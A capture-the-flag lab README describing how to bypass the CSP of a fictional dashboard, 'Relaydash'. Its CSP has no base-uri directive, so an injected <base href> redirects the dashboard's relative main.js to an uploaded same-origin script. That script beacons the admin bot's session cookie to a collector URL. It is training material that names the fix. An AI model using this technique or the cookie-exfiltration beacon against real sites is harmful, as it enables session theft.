# CSP Bypass via Missing base-uri Directive

> Track: `xss` · Difficulty: **expert** · ~45 min · Free hints.

## Scenario

**Relaydash** is a dashboard. Its Content-Security-Policy locks scripts down to
the app's own origin:

```
Content-Security-Policy: default-src 'self'; script-src 'self';
  img-src * data:; connect-src *; style-src 'self' 'unsafe-inline'; object-src 'none'
```

No `'unsafe-inline'`, so inline `<script>` and `onerror` handlers are blocked. The
page reflects a `?ref=` value into `<head>` **unescaped** (a single-tag HTML
injection), but with that CSP, a reflected `<script>`/`<img onerror>` never runs.

Two details matter. The dashboard loads its bundle with a **relative** path:

```html
<head>
  <title>Relaydash</title>
  <!-- your ?ref= injection lands here -->
  <script src="main.js"></script>
</head>
```

and the CSP has **no `base-uri` directive**.

The admin bot logs in (`/internal/bot-login`) and visits any path you queue via
`POST /report`, carrying its **non-HttpOnly** `session` cookie.

## Objective

`script-src` says scripts must be same-origin — but `base-uri` is what controls
how a **relative** URL like `main.js` resolves. With no `base-uri` directive, an
injected `<base href>` changes the document's base URL, so `main.js` resolves to a
path **you** choose. Keep that path on the **same origin** and it still satisfies
`script-src 'self'`.

The app hosts same-origin content you control: upload a script and it is served at
`/u/<id>/main.js`.

```
POST /upload   {"js":"<your bundle>"}   →   {"id":"<id>", "path":"/u/<id>/main.js"}
```

So: upload your bundle, then inject `<base href="/u/<id>/">`. The dashboard's
`main.js` now loads **your** upload — in Relaydash's origin, with the admin cookie
in scope. Beacon the cookie to the collector:

```
http://collector:9000/report?c=<document.cookie>
```

Read it back via `GET /oob/received`, then:

```
POST /solve   {"c":"<32 hex>"}
```

`/solve` returns `FLAG{<64 hex>}` when it matches the admin session.

## Getting Started

1. Confirm the CSP blocks inline: inject `<script>…</script>` / `<img onerror=…>`
   through `?ref=` — nothing runs. Read the CSP header. What is present
   (`script-src 'self'`) and, more importantly, what is **missing**?
2. View the page source. The bundle is loaded by a **relative** URL. What decides
   where a relative URL points — and which CSP directive was supposed to lock that
   down but isn't there?
3. You control same-origin content at `/u/<id>/main.js`. If you could make the
   page's relative `main.js` resolve to _that_ path, its script — yours — would
   load and satisfy `script-src 'self'`. One HTML tag does exactly that.

**CWE-79 / CWE-829 (Inclusion of Functionality from an Untrusted Control Sphere).
OWASP A03:2021 – Injection.** The fix — set `base-uri 'none'` (or `'self'`)
alongside every `script-src` — is in `SOLUTION.md`.

## Note on the stack

The catalogued scenario is a Ruby/Sinatra target with a second attacker origin.
This lab keeps a **Flask** target and makes the base-uri hijack **self-contained
and same-origin**: the redirected script is an ordinary uploaded file served under
`/u/<id>/main.js`, which is what keeps it inside `script-src 'self'`. See
`SOLUTION.md` for the deviation note and why the same-origin variant is the sound
one.
